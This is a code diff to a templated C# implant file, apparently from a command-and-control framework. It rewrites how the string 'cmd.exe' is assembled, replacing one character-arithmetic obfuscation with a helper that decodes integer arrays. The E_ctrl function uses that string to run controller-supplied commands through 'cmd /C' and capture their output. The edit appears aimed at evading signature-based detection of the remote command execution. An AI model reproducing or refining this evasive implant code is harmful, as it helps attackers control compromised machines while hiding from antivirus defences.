@@ -200,20 +200,29 @@ namespace {{ implant.name }}
             }
         }
 
+	static string BuildString(int[] first, int[] delta1, int[] second, int[] delta2)
+	{		
+		var sb = new StringBuilder();
+		for(int i=0; i<first.Length; i++) 
+			sb.Append((char)(first[i] + delta1[i]));
+		sb.Append('.');
+		for(int i=0; i<second.Length; i++)
+			sb.Append((char)(second[i] + delta2[i]));
+		return sb.ToString();
+	}
+	
+
         static string E_ctrl(string ctrl)
         {
             try
             {
                 Process temp = new Process(), pro = ((temp != null) ? temp : new Process());
-				string fileName = string.Concat(
-				(char)(new Random().Next(99, 100)), 
-				(char)(110-1), 
-				(char)(130-30), 
-				'.', 
-				(char)(116-15), 
-				(char)(122-2), 
-				(char)(112-11)
-				);
+		string fileName = BuildString(
+			new[] { 99, 110, 130 }, 
+			new[] { 0, -1, -30 }, 
+			new[] { 116, 122, 112 }, 
+			new[] { -15, -2, -11 }
+		);
                 pro.StartInfo.FileName = fileName;
                 pro.StartInfo.Arguments = String.Format("/C {0}", ctrl);
                 pro.StartInfo.RedirectStandardOutput = true;
